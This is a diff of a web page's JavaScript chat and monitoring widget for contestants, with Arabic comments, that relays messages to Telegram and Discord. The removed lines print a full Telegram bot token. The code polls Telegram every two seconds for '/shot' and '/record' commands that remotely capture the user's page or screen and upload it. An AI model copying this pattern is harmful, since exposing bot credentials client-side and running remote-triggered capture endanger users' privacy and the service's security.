-    // كود المحادثة والمراقبة المباشرة المحدث والمطور
+    // كود المحادثة والمراقبة المباشرة المحدث والمطور (يعمل على CHAT_BOT_CONFIG)
     // ==========================================
-    const BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
-    const CHAT_ID = "8796885500";
-
     let contestantId = localStorage.getItem("contestant_id");
     let contestantName = localStorage.getItem("contestant_name") || "متسابق";
 
@@ -2693,7 +2733,6 @@ document.addEventListener('DOMContentLoaded', () => {
         localStorage.setItem("contestant_id", contestantId);
     }
 
-    // استعادة آخر ID تحديث تم استلامه حتى لا تتكرر الرسائل عند فتح المتصفح
     let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
     const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
 
@@ -2701,24 +2740,20 @@ document.addEventListener('DOMContentLoaded', () => {
     let autoCloseTimer = null;
     let isSupportOnline = true;
 
-    // ضوابط عدم التكرار للتنبيهات (60 ثانية)
     let lastLeaveAlertTime = 0;
     let lastOnlineAlertTime = 0;
     const THROTTLE_60_SEC = 60000;
 
-    // متغيرات تسجيل الفيديو
     let mediaRecorder = null;
     let recordedChunks = [];
     let isRecording = false;
 
-    // تحميل السجل والمسودة عند البدء
     document.addEventListener("DOMContentLoaded", () => {
         loadChatHistory();
         loadDraftMessage();
         notifyUserEntrance();
     });
 
-    // الأصوات التفاعلية
     function playNotificationSound(type = 'receive') {
         try {
             const ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -2744,7 +2779,6 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch (e) { }
     }
 
-    // فتح وإغلاق نافذة الدردشة
     window.toggleChat = function() {
         const widget = document.getElementById("chat-widget");
         if (!widget) return;
@@ -2808,10 +2842,10 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function sendTelegramAlert(text) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ chat_id: CHAT_BOT_CONFIG.chatId, text: text, parse_mode: "Markdown" })
         }).catch(() => {});
     }
 
@@ -2844,7 +2878,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (preview) preview.style.display = "block";
     };
 
-    // إرسال رسالة من المتسابق
+    // إرسال رسالة من المتسابق (يرسل لبوت الدردشة)
     window.sendChatMessage = function(e) {
         if (e) e.preventDefault();
         cancelAutoClose();
@@ -2864,22 +2898,33 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (hasFile) {
             const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
+            formData.append("chat_id", CHAT_BOT_CONFIG.chatId);
             formData.append("photo", fileInput.files[0]);
             formData.append("caption", formattedHeader);
             formData.append("parse_mode", "Markdown");
 
             const fileURL = URL.createObjectURL(fileInput.files[0]);
             displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/sendPhoto`, { method: "POST", body: formData });
         } else {
             displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: formattedHeader, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: CHAT_BOT_CONFIG.chatId, text: formattedHeader, parse_mode: "Markdown" })
             });
         }
+
+        // إرسال كـ بطاقة إلى ديسكورد لتنبيه المسؤولين عن الشات
+        sendDiscordEmbed({
+            title: "💬 رسالة دردشة مباشرة جديدة",
+            color: 0x3498db,
+            fields: [
+                { name: "👤 المتسابق", value: contestantName, inline: true },
+                { name: "🆔 المعرف", value: contestantId, inline: true },
+                { name: "💬 نص الرسالة", value: text || "[مرفق صورة/ملف]", inline: false }
+            ]
+        });
 
         if (!isSupportOnline) {
             setTimeout(() => {
@@ -2893,12 +2938,10 @@ document.addEventListener('DOMContentLoaded', () => {
         if (preview) preview.style.display = "none";
     };
 
-    // التقاط شاشة فوري للمتسابق
     window.takeUserInstantScreenshot = function() {
         takeScreenShot(0);
     };
 
-    // دالة التقاط الشاشة مع إمكانية تحديد زمن التأخير (بالثواني)
     function takeScreenShot(delaySeconds = 0) {
         if (typeof html2canvas === 'undefined') return;
         
@@ -2906,7 +2949,7 @@ document.addEventListener('DOMContentLoaded', () => {
             html2canvas(document.body).then(canvas => {
                 canvas.toBlob(blob => {
                     const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
+                    formData.append("chat_id", CHAT_BOT_CONFIG.chatId);
                     formData.append("photo", blob, "user_screenshot.png");
                     formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
                     formData.append("parse_mode", "Markdown");
@@ -2916,7 +2959,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
                     playNotificationSound('send');
 
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/sendPhoto`, { method: "POST", body: formData });
                 });
             });
         };
@@ -2928,7 +2971,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // دالة تسجيل الفيديو المحدثة بالكامل
     async function startScreenRecording(durationSeconds = 10, delaySeconds = 0) {
         if (isRecording) return;
 
@@ -2952,22 +2994,20 @@ document.addEventListener('DOMContentLoaded', () => {
                     
                     const blob = new Blob(recordedChunks, { type: "video/webm" });
                     const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
+                    formData.append("chat_id", CHAT_BOT_CONFIG.chatId);
                     formData.append("video", blob, "screen_record.webm");
                     formData.append("caption", `🎥 **تسجيل فيديو للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
                     formData.append("parse_mode", "Markdown");
 
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: formData })
+                    fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/sendVideo`, { method: "POST", body: formData })
                         .catch(() => {
-                            // محاولة الإرسال كمستند إذا فشل كفيديو
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: formData });
+                            fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/sendDocument`, { method: "POST", body: formData });
                         });
                 };
 
                 mediaRecorder.start();
                 isRecording = true;
 
-                // إيقاف التسجيل تلقائياً بعد المدة المحددة
                 if (durationSeconds > 0) {
                     setTimeout(() => {
                         stopScreenRecording();
@@ -3025,9 +3065,9 @@ document.addEventListener('DOMContentLoaded', () => {
         chatBox.scrollTop = chatBox.scrollHeight;
     }
 
-    // جلب الرسائل والصور والأوامر من التليجرام مع حل مشكلة وصول الصور وعدم التكرار
+    // جلب الرسائل والصور والأوامر من بوت الدردشة الخاص بالدعم الفني
     function fetchAdminMessages() {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+        fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/getUpdates?offset=${lastUpdateId + 1}`)
             .then(res => res.json())
             .then(async data => {
                 if (data.ok && data.result.length > 0) {
@@ -3038,25 +3078,19 @@ document.addEventListener('DOMContentLoaded', () => {
                         const msg = update.message;
                         if (!msg) continue;
 
-                        // منع تكرار معالجة نفس الرسالة
                         if (processedMsgIds.has(msg.message_id)) continue;
 
                         let text = msg.text || msg.caption || "";
 
-                        // التحقق من أن الرسالة تخص هذا المتسابق
                         if (text.includes(contestantId)) {
                             processedMsgIds.add(msg.message_id);
                             sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
 
-                            // تحديث علم القرّاءة
                             document.querySelectorAll(".user-msg .checkmark").forEach(el => {
                                 el.innerText = "✔✔";
                                 el.classList.add("read");
                             });
 
-                            // --- معالجة الأوامر المتقدمة مع الثواني والتأخير ---
-                            
-                            // أمر لقطة الشاشة: مثال /shot أو /shot 5 (تأخير 5 ثوانٍ)
                             if (text.includes("/shot")) {
                                 const match = text.match(/\/shot\s*(\d+)?/i);
                                 const delay = match && match[1] ? parseInt(match[1]) : 0;
@@ -3064,7 +3098,6 @@ document.addEventListener('DOMContentLoaded', () => {
                                 continue;
                             }
 
-                            // أمر تسجيل الفيديو: مثال /record 10 5 (تسجيل 10 ثوانٍ بعد تأخير 5 ثوانٍ)
                             if (text.includes("/record")) {
                                 const match = text.match(/\/record\s*(\d+)?\s*(\d+)?/i);
                                 const duration = match && match[1] ? parseInt(match[1]) : 10;
@@ -3088,20 +3121,18 @@ document.addEventListener('DOMContentLoaded', () => {
                                 continue;
                             }
 
-                            // --- معالجة الصور المرسلة من التليجرام ---
                             let telegramImgUrl = null;
                             if (msg.photo && msg.photo.length > 0) {
                                 const largestPhoto = msg.photo[msg.photo.length - 1];
                                 try {
-                                    const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
+                                    const fileRes = await fetch(`https://api.telegram.org/bot${CHAT_BOT_CONFIG.botToken}/getFile?file_id=${largestPhoto.file_id}`);
                                     const fileData = await fileRes.json();
                                     if (fileData.ok && fileData.result.file_path) {
-                                        telegramImgUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                                        telegramImgUrl = `https://api.telegram.org/file/bot${CHAT_BOT_CONFIG.botToken}/${fileData.result.file_path}`;
                                     }
                                 } catch (e) {}
                             }
 
-                            // تنظيف النص وإبراز رد الدعم
                             let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
                             if (cleanText || telegramImgUrl) {
                                 displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
@@ -3115,7 +3146,6 @@ document.addEventListener('DOMContentLoaded', () => {
             .catch(() => {});
     }
 
-    // إكمال دالة تغيير حالة الدعم الفني
     function setSupportStatus(online) {
         isSupportOnline = online;
         const dot1 = document.getElementById("support-status-dot");
@@ -3133,7 +3163,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // تشغيل الفحص المستمر كل ثانيتين
     setInterval(fetchAdminMessages, 2000);
 </script>
 
